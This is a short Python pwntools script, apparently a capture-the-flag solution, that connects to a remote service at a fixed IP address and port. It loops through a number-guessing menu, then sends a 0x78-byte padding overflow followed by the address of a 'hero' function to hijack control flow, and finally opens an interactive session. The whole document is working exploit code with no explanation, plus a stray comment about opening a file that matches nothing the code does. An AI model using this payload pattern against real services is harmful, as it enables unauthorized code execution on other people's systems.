from pwn import *
elf = ELF('./padding')
#libc = ELF('./libc.so.6')
p = remote('115.127.114.85',8009)

hero = elf.symbols.hero
#p= elf.process()
#context.terminal = ['tmux', 'splitw', '-h'] 
context.log_level = 'debug'
while(1):
    p.recvuntil('Catch the Number : ')
    chek = int(p.recvline())
    if chek == 0:
        p.recvuntil('3 - End\n')
        payload=b'2\n'
        p.send(payload)
        p.recvuntil('Surely, you’ve figured out the secret by now! :( :\x0a')
        p.send(b'A'*0x78)
        p.send(p64(elf.symbols.hero))
        break
    p.recvuntil('3 - End\n')
    payload=b'1\n'
    p.send(payload)
# Open the file in write mode
# If the file does not exist, it will be created
p.interactive()

